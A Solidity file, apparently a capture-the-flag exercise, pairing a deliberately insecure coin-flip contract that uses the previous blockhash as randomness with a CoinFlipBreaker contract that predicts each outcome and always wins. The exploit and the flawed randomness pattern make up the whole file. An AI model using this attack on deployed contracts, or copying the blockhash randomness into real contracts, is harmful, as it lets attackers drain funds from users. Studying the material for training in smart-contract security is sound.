// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract CoinFlipBreaker {
    CoinFlip coinFlipContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipContract = CoinFlip(_coinFlipAddress);
    }

    function flip() external {
        bool guess = _guessFlip();
        require(coinFlipContract.flip(guess), "failed");
    }

    function _guessFlip() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("Block number:", block.number);
        console.log("blockValue:", blockValue);
        console.log("coinFlip:", blockValue / FACTOR);
        console.log("lastHash:", lastHash);

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        console.log(side, _guess);
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}